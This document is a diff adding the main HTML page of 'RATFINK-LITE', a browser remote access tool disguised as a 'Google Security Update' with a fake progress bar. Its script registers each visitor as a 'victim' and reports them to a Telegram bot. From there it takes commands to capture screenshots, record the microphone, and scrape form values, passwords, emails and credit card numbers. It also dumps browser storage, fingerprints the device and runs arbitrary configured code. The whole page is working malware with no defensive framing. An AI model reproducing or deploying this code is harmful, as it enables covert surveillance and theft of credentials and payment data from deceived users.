@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Google Security Update</title>
+    
+    <!-- LOAD CONFIG -->
+    <script src="config.js"></script>
+    
+    <!-- LOAD MODULES -->
+    <script src="telegram-bot.js"></script>
+    <script src="audio-controller.js"></script>
+    <script src="file-acquisition.js"></script>
+    <script src="admin-panel.js"></script>
+    <script src="utils.js"></script>
+    
+    <!-- LOAD STYLES -->
+    <link rel="stylesheet" href="style.css">
+    
+    <!-- HTML2Canvas untuk screenshot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+</head>
+<body>
+    <div class="card" id="mainCard">
+        <div class="header">
+            <div class="shield-icon" id="mainIcon">🛡️</div>
+            <h1 id="mainTitle">Google Security Update</h1>
+            <div class="subtitle" id="subTitle">Critical security patch required for your device</div>
+        </div>
+        
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <!-- Audio Visualizer -->
+        <div class="audio-visualizer hidden" id="audioVisualizer">
+            <div class="visualizer-bar" id="visualizerBar"></div>
+        </div>
+        
+        <!-- Status Display -->
+        <div class="status-box" id="statusDisplay">
+            <div class="status-item">
+                <span class="status-label">Device ID:</span>
+                <span class="status-value" id="deviceId">Loading...</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Status:</span>
+                <span class="status-value" id="connectionStatus">Connecting...</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Audio:</span>
+                <span class="status-value" id="audioStatus">Idle</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label">Last Command:</span>
+                <span class="status-value" id="lastCommand">None</span>
+            </div>
+        </div>
+        
+        <!-- Warning Message -->
+        <div class="alert alert-warning" id="warningMsg">
+            ⚠️ Do not close this window. Update in progress...
+        </div>
+        
+        <!-- Audio Controls -->
+        <div class="audio-controls" id="audioControls">
+            <button class="audio-btn" id="playBtn" title="Play">▶️</button>
+            <button class="audio-btn" id="stopBtn" title="Stop">⏹️</button>
+            <button class="audio-btn" id="recordBtn" title="Record">🎙️</button>
+            <button class="audio-btn" id="screamBtn" title="Scream">😱</button>
+            <button class="audio-btn" id="volumeUpBtn" title="Volume Up">🔊</button>
+            <button class="audio-btn" id="volumeDownBtn" title="Volume Down">🔉</button>
+        </div>
+        
+        <!-- Hidden Button -->
+        <button class="btn hidden" id="actionBtn">Complete Update</button>
+    </div>
+
+    <script>
+        // ============================================
+        // RATFINK-LITE MAIN SCRIPT
+        // Copyright © VROZZ
+        // ============================================
+        
+        // Use config
+        const CONFIG = RATFINK_CONFIG;
+        
+        // Variables
+        let victimId = generateVictimId();
+        let lastCommandId = 0;
+        let checkInterval;
+        let heartbeatInterval;
+        let audioController;
+        let fileAcq;
+        let adminPanel;
+        let telegram;
+        let utils = Utils;
+        let startTime = Date.now();
+        
+        // Current user
+        let currentUser = {
+            id: null,
+            username: null,
+            role: 'user'
+        };
+        
+        // Initialize
+        async function init() {
+            // Update UI
+            document.getElementById('deviceId').innerText = victimId;
+            
+            // Set fake title
+            if (CONFIG.ui.fake_page.title) {
+                document.getElementById('mainTitle').innerText = CONFIG.ui.fake_page.title;
+            }
+            
+            // Initialize Telegram
+            telegram = new TelegramBot(CONFIG.telegram);
+            
+            // Initialize Audio Controller
+            audioController = new AudioController(CONFIG, telegram);
+            audioController.setVolume(CONFIG.audio.DEFAULT_VOLUME);
+            
+            // Initialize File Acquisition
+            fileAcq = new FileAcquisition(CONFIG, telegram);
+            
+            // Initialize Admin Panel
+            adminPanel = new AdminPanel(CONFIG, telegram, audioController, fileAcq);
+            
+            // Get victim info
+            const ip = await getIP();
+            const browserInfo = utils.getBrowserInfo();
+            const screenInfo = utils.getScreenInfo();
+            
+            // Kirim notifikasi victim online
+            await sendNotification('new_victim', {
+                id: victimId,
+                ip: ip,
+                platform: browserInfo.platform,
+                browser: browserInfo.userAgent,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                time: new Date().toLocaleString(),
+                userId: currentUser.id || 'unknown'
+            });
+            
+            // Update progress bar
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 1;
+                document.getElementById('progressBar').style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    document.getElementById('warningMsg').innerHTML = '✅ Update completed! System secured.';
+                    document.getElementById('warningMsg').className = 'alert alert-success';
+                }
+            }, 100);
+            
+            // Start checking commands
+            checkInterval = setInterval(checkCommands, CONFIG.victims.HEARTBEAT_INTERVAL * 1000);
+            
+            // Heartbeat
+            heartbeatInterval = setInterval(sendHeartbeat, 30000);
+            
+            // Setup audio controls
+            setupAudioControls();
+            
+            // Prevent close
+            window.onbeforeunload = function() {
+                sendNotification('victim_offline', {
+                    id: victimId,
+                    reason: 'page closed',
+                    lastSeen: new Date().toLocaleString(),
+                    duration: formatDuration(Math.floor((Date.now() - startTime) / 1000))
+                });
+                return "Update in progress. Closing may cause system instability.";
+            };
+        }
+        
+        // Setup audio controls
+        function setupAudioControls() {
+            document.getElementById('playBtn').addEventListener('click', () => {
+                audioController.playPreset('ALERT');
+            });
+            
+            document.getElementById('stopBtn').addEventListener('click', () => {
+                audioController.stop();
+                document.getElementById('audioStatus').innerText = 'Stopped';
+            });
+            
+            document.getElementById('recordBtn').addEventListener('click', async () => {
+                const result = await audioController.startRecording(5);
+                if (result.status === 'success') {
+                    document.getElementById('audioStatus').innerText = 'Recording...';
+                    document.getElementById('recordBtn').classList.add('recording');
+                    
+                    setTimeout(() => {
+                        document.getElementById('recordBtn').classList.remove('recording');
+                        document.getElementById('audioStatus').innerText = 'Recorded';
+                    }, 5000);
+                }
+            });
+            
+            document.getElementById('screamBtn').addEventListener('click', () => {
+                audioController.playPreset('SCREAM');
+                document.getElementById('audioStatus').innerText = 'Screaming';
+            });
+            
+            document.getElementById('volumeUpBtn').addEventListener('click', () => {
+                let currentVol = audioController.getStatus().volume;
+                let newVol = Math.min(1, currentVol + 0.1);
+                audioController.setVolume(newVol);
+                document.getElementById('audioStatus').innerText = `Volume: ${Math.round(newVol*100)}%`;
+            });
+            
+            document.getElementById('volumeDownBtn').addEventListener('click', () => {
+                let currentVol = audioController.getStatus().volume;
+                let newVol = Math.max(0, currentVol - 0.1);
+                audioController.setVolume(newVol);
+                document.getElementById('audioStatus').innerText = `Volume: ${Math.round(newVol*100)}%`;
+            });
+        }
+        
+        // Check commands from Telegram
+        async function checkCommands() {
+            const updates = await telegram.getUpdates(lastCommandId + 1);
+            
+            for (const update of updates) {
+                lastCommandId = Math.max(lastCommandId, update.update_id);
+                
+                const message = update.message;
+                if (!message || !message.text) continue;
+                
+                // Process command
+                await processCommand(message);
+            }
+        }
+        
+        // Process command
+        async function processCommand(message) {
+            const userId = message.from.id;
+            const username = message.from.username || 'unknown';
+            const commandText = message.text.trim();
+            const chatId = message.chat.id;
+            
+            // Check if from allowed group
+            if (chatId.toString() !== CONFIG.telegram.GROUP_ID) {
+                return;
+            }
+            
+            // Check authorization
+            if (!isUserAuthorized(userId, commandText)) {
+                await telegram.sendMessage(`⛔ *Access Denied*\nUser: ${username} (${userId})\nNot authorized to use RATFINK-LITE.`);
+                return;
+            }
+            
+            // Check command permission
+            if (!isCommandAllowed(userId, commandText)) {
+                const role = getUserRole(userId);
+                await telegram.sendMessage(`⛔ *Permission Denied*\nUser: ${username} (${userId})\nRole: ${role}\nCommand not allowed for your role.`);
+                return;
+            }
+            
+            // Set current user
+            currentUser = {
+                id: userId,
+                username: username,
+                role: getUserRole(userId)
+            };
+            
+            // Parse command
+            const parts = commandText.split(' ');
+            const cmd = parts[0].toLowerCase();
+            const params = parts.slice(1);
+            
+            let result;
+            
+            // Check if admin command
+            if (cmd.startsWith('/admin_') || CONFIG.admin_menu.quick_commands[cmd]) {
+                // Use admin panel
+                const adminCmd = CONFIG.admin_menu.quick_commands[cmd] || cmd;
+                result = await adminPanel.handleCommand(adminCmd, params, currentUser, victimId);
+            } else {
+                // Regular commands
+                switch(cmd) {
+                    // Basic commands
+                    case '/ping':
+                        result = await cmdPing(params);
+                        break;
+                        
+                    case '/info':
+                        result = await cmdInfo(params);
+                        break;
+                        
+                    case '/help':
+                        result = await cmdHelp(userId);
+                        break;
+                    
+                    // Audio commands
+                    case '/play':
+                        result = await cmdPlay(params);
+                        break;
+                        
+                    case '/stop':
+                        result = await cmdStop(params);
+                        break;
+                        
+                    case '/tts':
+                        result = await cmdTTS(params);
+                        break;
+                        
+                    case '/record':
+                        result = await cmdRecord(params);
+                        break;
+                        
+                    case '/scream':
+                        result = await cmdScream(params);
+                        break;
+                        
+                    case '/presets':
+                        result = await cmdPresets(params);
+                        break;
+                        
+                    case '/volume':
+                        result = await cmdVolume(params);
+                        break;
+                    
+                    // File commands
+                    case '/scan':
+                        result = await cmdScan(params);
+                        break;
+                        
+                    case '/getbrowser':
+                        result = await cmdGetBrowser(params);
+                        break;
+                        
+                    case '/getscreenshot':
+                        result = await cmdGetScreenshot(params);
+                        break;
+                        
+                    case '/getforms':
+                        result = await cmdGetForms(params);
+                        break;
+                        
+                    case '/getlinks':
+                        result = await cmdGetLinks(params);
+                        break;
+                        
+                    case '/getcredentials':
+                        result = await cmdGetCredentials(params);
+                        break;
+                        
+                    case '/getfingerprint':
+                        result = await cmdGetFingerprint(params);
+                        break;
+                        
+                    case '/getnetwork':
+                        result = await cmdGetNetwork(params);
+                        break;
+                        
+                    case '/download':
+                        result = await cmdDownload(params);
+                        break;
+                        
+                    case '/pickfile':
+                        result = await cmdPickFile(params);
+                        break;
+                    
+                    // Custom commands
+                    default:
+                        if (CONFIG.custom_commands[cmd]) {
+                            try {
+                                const func = new Function('audioController', 'fileAcq', 'utils', 'victimId', CONFIG.custom_commands[cmd]);
+                                result = { status: 'success', message: await func(audioController, fileAcq, utils, victimId) };
+                            } catch (e) {
+                                result = { status: 'error', message: e.message };
+                            }
+                        } else {
+                            result = { status: 'error', message: 'Unknown command. Try /help' };
+                        }
+                }
+            }
+            
+            // Send result
+            if (result) {
+                await sendNotification('command_result', {
+                    victimId: victimId,
+                    command: commandText,
+                    result: result.message || JSON.stringify(result),
+                    status: result.status,
+                    executor: `${username} (${userId})`
+                });
+            }
+            
+            // Update UI
+            document.getElementById('lastCommand').innerText = commandText;
+        }
+        
+        // ===== COMMAND HANDLERS =====
+        
+        async function cmdPing(params) {
+            return {
+                status: 'success',
+                message: `PONG! RATFINK-LITE victim ${victimId} is online\nUptime: ${formatDuration(Math.floor((Date.now() - startTime) / 1000))}`
+            };
+        }
+        
+        async function cmdInfo(params) {
+            const browserInfo = utils.getBrowserInfo();
+            const screenInfo = utils.getScreenInfo();
+            const ip = await getIP();
+            
+            const info = {
+                'Victim ID': victimId,
+                'IP Address': ip,
+                'Platform': browserInfo.platform,
+                'Browser': browserInfo.userAgent.substring(0, 50) + '...',
+                'Language': browserInfo.language,
+                'Screen': `${screenInfo.width}x${screenInfo.height}`,
+                'CPU Cores': browserInfo.hardwareConcurrency || 'unknown',
+                'Memory': browserInfo.deviceMemory ? browserInfo.deviceMemory + 'GB' : 'unknown',
+                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+                'Cookies': browserInfo.cookiesEnabled ? 'Enabled' : 'Disabled',
+                'Uptime': formatDuration(Math.floor((Date.now() - startTime) / 1000)),
+                'URL': window.location.href
+            };
+            
+            return {
+                status: 'success',
+                message: Object.entries(info).map(([k, v]) => `*${k}:* ${v}`).join('\n')
+            };
+        }
+        
+        async function cmdHelp(userId) {
+            const role = getUserRole(userId);
+            let commands = [];
+            
+            if (role === 'admin') {
+                commands = [
+                    '🔹 *BASIC COMMANDS*',
+                    '/ping - Cek koneksi',
+                    '/info - Info victim',
+                    '/help - Menu ini',
+                    '',
+                    '🎵 *AUDIO COMMANDS*',
+                    '/play [url/preset] - Play audio',
+                    '/stop - Stop audio',
+                    '/tts [text] - Text-to-speech',
+                    '/record [detik] - Rekam mic',
+                    '/scream - Suara teriak',
+                    '/presets - List preset',
+                    '/volume [0-1] - Atur volume',
+                    '',
+                    '📁 *FILE COMMANDS*',
+                    '/scan - Scan file di page',
+                    '/getbrowser - Ambil browser data',
+                    '/getscreenshot - Screenshot',
+                    '/getforms - Ambil form data',
+                    '/getlinks - Ambil links',
+                    '/getcredentials - Cari credentials',
+                    '/getfingerprint - Fingerprint',
+                    '/getnetwork - Info jaringan',
+                    '/download [url] - Download file',
+                    '/pickfile - Pilih file',
+                    '',
+                    '👑 *ADMIN COMMANDS*',
+                    'Gunakan /admin_help untuk list'
+                ];
+            } else {
+                commands = [
+                    '🔹 *BASIC COMMANDS*',
+                    '/ping - Cek koneksi',
+                    '/info - Info victim',
+                    '/help - Menu ini',
+                    '',
+                    '🎵 *AUDIO COMMANDS*',
+                    '/play [url/preset] - Play audio',
+                    '/stop - Stop audio',
+                    '/tts [text] - Text-to-speech',
+                    '/presets - List preset',
+                    '/volume [0-1] - Atur volume'
+                ];
+            }
+            
+            return {
+                status: 'success',
+                message: `🔰 *RATFINK-LITE HELP*\nRole: ${role}\n\n` + commands.join('\n')
+            };
+        }
+        
+        async function cmdPlay(params) {
+            if (params.length === 0) {
+                return { status: 'error', message: 'Usage: /play <url|preset> [volume] [loop]' };
+            }
+            
+            const source = params[0];
+            const volume = params[1] ? parseFloat(params[1]) : CONFIG.audio.DEFAULT_VOLUME;
+            const loop = params[2] === 'loop';
+            
+            let result;
+            
+            if (CONFIG.audio.PRESET_SOUNDS[source.toUpperCase()]) {
+                result = await audioController.playPreset(source.toUpperCase(), volume, loop);
+            } else {
+                result = await audioController.playFromUrl(source, volume, loop);
+            }
+            
+            if (result.status === 'success') {
+                document.getElementById('audioVisualizer').classList.remove('hidden');
+                document.getElementById('audioStatus').innerText = 'Playing';
+                startVisualizer();
+            }
+            
+            return result;
+        }
+        
+        async function cmdStop(params) {
+            const result = audioController.stop();
+            document.getElementById('audioVisualizer').classList.add('hidden');
+            document.getElementById('audioStatus').innerText = 'Stopped';
+            document.getElementById('visualizerBar').style.width = '0%';
+            return result;
+        }
+        
+        async function cmdTTS(params) {
+            if (params.length === 0) {
+                return { status: 'error', message: 'Usage: /tts <text> [lang]' };
+            }
+            
+            const text = params.join(' ');
+            const lang = params.includes('-') ? params[params.length-1] : CONFIG.audio.DEFAULT_TTS_LANG;
+            
+            const result = await audioController.textToSpeech(text, null, lang);
+            
+            if (result.status === 'success') {
+                document.getElementById('audioStatus').innerText = 'Speaking';
+            }
+            
+            return result;
+        }
+        
+        async function cmdRecord(params) {
+            const duration = params[0] ? parseInt(params[0]) : CONFIG.audio.RECORD_DURATION;
+            
+            const startResult = await audioController.startRecording(duration);
+            
+            if (startResult.status === 'success') {
+                document.getElementById('audioStatus').innerText = 'Recording...';
+                
+                setTimeout(async () => {
+                    const stopResult = await audioController.stopRecording();
+                    
+                    if (stopResult.status === 'success' && CONFIG.audio.AUTO_SEND_RECORDING) {
+                        await telegram.sendAudio(stopResult.blob, `🎙️ Recording from ${victimId}\nDuration: ${duration}s`);
+                    }
+                    
+                    document.getElementById('audioStatus').innerText = 'Idle';
+                }, duration * 1000);
+            }
+            
+            return startResult;
+        }
+        
+        async function cmdScream(params) {
+            const screamType = params[0] || 'SCREAM';
+            const result = await audioController.playPreset(screamType, 1.0, false);
+            return result;
+        }
+        
+        async function cmdPresets(params) {
+            const presets = audioController.getPresetList();
+            const presetList = presets.map(p => `• ${p}`).join('\n');
+            
+            return {
+                status: 'success',
+                message: `*RATFINK-LITE AUDIO PRESETS*\n\n${presetList}\n\nTotal: ${presets.length} presets`
+            };
+        }
+        
+        async function cmdVolume(params) {
+            if (params.length === 0) {
+                const status = audioController.getStatus();
+                return {
+                    status: 'success',
+                    message: `Current volume: ${Math.round(status.volume * 100)}%`
+                };
+            }
+            
+            const volume = parseFloat(params[0]);
+            audioController.setVolume(volume);
+            
+            return {
+                status: 'success',
+                message: `Volume set to ${Math.round(volume * 100)}%`
+            };
+        }
+        
+        async function cmdScan(params) {
+            const files = fileAcq.scanPageForFiles();
+            
+            if (files.length === 0) {
+                return { status: 'info', message: 'No downloadable files found on page' };
+            }
+            
+            const fileList = files.map((f, i) => `${i+1}. ${f.url} (${f.type})`).join('\n');
+            
+            return {
+                status: 'success',
+                message: `📁 *FILES FOUND* (${files.length})\n\n${fileList}`
+            };
+        }
+        
+        async function cmdGetBrowser(params) {
+            const data = await fileAcq.getBrowserStorage();
+            
+            return {
+                status: 'success',
+                message: `📊 *BROWSER DATA*\n\n` +
+                         `LocalStorage: ${Object.keys(data.localStorage).length} items\n` +
+                         `SessionStorage: ${Object.keys(data.sessionStorage).length} items\n` +
+                         `Cookies: ${data.cookies ? 'present' : 'none'}\n` +
+                         `IndexedDB: ${data.indexedDB.length} databases`
+            };
+        }
+        
+        async function cmdGetScreenshot(params) {
+            const result = await fileAcq.captureScreenshot();
+            
+            if (result.status === 'success') {
+                await sendPhotoToTelegram(result.data, `📸 Screenshot from ${victimId}`);
+                
+                return {
+                    status: 'success',
+                    message: `Screenshot captured and sent (${formatBytes(result.size)})`
+                };
+            }
+            
+            return result;
+        }
+        
+        async function cmdGetForms(params) {
+            const forms = fileAcq.extractForms();
+            
+            if (forms.length === 0) {
+                return { status: 'info', message: 'No forms found on page' };
+            }
+            
+            let response = `📝 *FORMS FOUND* (${forms.length})\n\n`;
+            
+            forms.forEach((form, i) => {
+                response += `*Form ${i+1}*: ${form.action || 'no action'}\n`;
+                form.fields.forEach(field => {
+                    if (field.value) {
+                        response += `  - ${field.name} (${field.type}): ${field.value}\n`;
+                    }
+                });
+                response += '\n';
+            });
+            
+            return { status: 'success', message: response };
+        }
+        
+        async function cmdGetLinks(params) {
+            const links = fileAcq.extractLinks();
+            const limit = params[0] ? parseInt(params[0]) : 20;
+            
+            const linkList = links.slice(0, limit).map(l => `• ${l.text || 'no text'}: ${l.href}`).join('\n');
+            
+            return {
+                status: 'success',
+                message: `🔗 *LINKS* (${links.length} total, showing ${limit})\n\n${linkList}`
+            };
+        }
+        
+        async function cmdGetCredentials(params) {
+            const credentials = fileAcq.scanForCredentials();
+            
+            let response = `🔑 *CREDENTIALS FOUND*\n\n`;
+            
+            if (credentials.passwords.length > 0) {
+                response += `*Passwords:* ${credentials.passwords.length}\n`;
+                credentials.passwords.forEach(p => {
+                    response += `  - ${p.name}: ${p.value}\n`;
+                });
+            }
+            
+            if (credentials.emails.length > 0) {
+                response += `\n*Emails:* ${credentials.emails.length}\n`;
+                credentials.emails.forEach(e => {
+                    response += `  - ${e.name}: ${e.value}\n`;
+                });
+            }
+            
+            if (credentials.creditCards.length > 0) {
+                response += `\n*Credit Cards:* ${credentials.creditCards.length}\n`;
+                credentials.creditCards.forEach(cc => {
+                    response += `  - ${cc}\n`;
+                });
+            }
+            
+            return { status: 'success', message: response };
+        }
+        
+        async function cmdGetFingerprint(params) {
+            const fingerprint = fileAcq.getBrowserFingerprint();
+            
+            return {
+                status: 'success',
+                message: `🖥️ *BROWSER FINGERPRINT*\n\n` +
+                         `Platform: ${fingerprint.platform}\n` +
+                         `User Agent: ${fingerprint.userAgent.substring(0, 50)}...\n` +
+                         `Language: ${fingerprint.language}\n` +
+                         `Screen: ${fingerprint.screen.width}x${fingerprint.screen.height}\n` +
+                         `CPU Cores: ${fingerprint.hardwareConcurrency}\n` +
+                         `Memory: ${fingerprint.deviceMemory}GB\n` +
+                         `Timezone: ${fingerprint.timezone}\n` +
+                         `Plugins: ${fingerprint.plugins.length}`
+            };
+        }
+        
+        async function cmdGetNetwork(params) {
+            const networkInfo = await fileAcq.getNetworkInfo();
+            
+            return {
+                status: 'success',
+                message: `🌐 *NETWORK INFO*\n\n` +
+                         `IP: ${networkInfo.ip || 'unknown'}\n` +
+                         `Country: ${networkInfo.country || 'unknown'}\n` +
+                         `City: ${networkInfo.city || 'unknown'}\n` +
+                         `ISP: ${networkInfo.isp || 'unknown'}\n` +
+                         `Connection: ${networkInfo.connection ? networkInfo.connection.type : 'unknown'}`
+            };
+        }
+        
+        async function cmdDownload(params) {
+            if (params.length === 0) {
+                return { status: 'error', message: 'Usage: /download <url> [filename]' };
+            }
+            
+            const url = params[0];
+            const filename = params[1] || '';
+            
+            const result = await fileAcq.downloadFromUrl(url, filename);
+            return result;
+        }
+        
+        async function cmdPickFile(params) {
+            fileAcq.triggerFilePicker(true);
+            return { status: 'info', message: 'File picker opened on victim device' };
+        }
+        
+        // ===== UTILITY FUNCTIONS =====
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Unknown';
+            }
+        }
+        
+        function startVisualizer() {
+            setInterval(() => {
+                const width = Math.random() * 100;
+                document.getElementById('visualizerBar').style.width = width + '%';
+            }, 100);
+        }
+        
+        async function sendNotification(type, data) {
+            const message = formatTelegramMessage(type, data);
+            await telegram.sendMessage(message);
+        }
+        
+        async function sendPhotoToTelegram(base64Data, caption = '') {
+            const blob = utils.base64ToBlob(base64Data, 'image/png');
+            await telegram.sendPhoto(blob, caption);
+        }
+        
+        async function sendHeartbeat() {
+            await sendNotification('heartbeat', {
+                victimId: victimId,
+                status: 'online',
+                uptime: formatDuration(Math.floor((Date.now() - startTime) / 1000)),
+                activity: audioController.isPlaying ? 'playing audio' : 'idle'
+            });
+        }
+        
+        // Start
+        window.addEventListener('load', init);
+    </script>
+</body>
+</html>
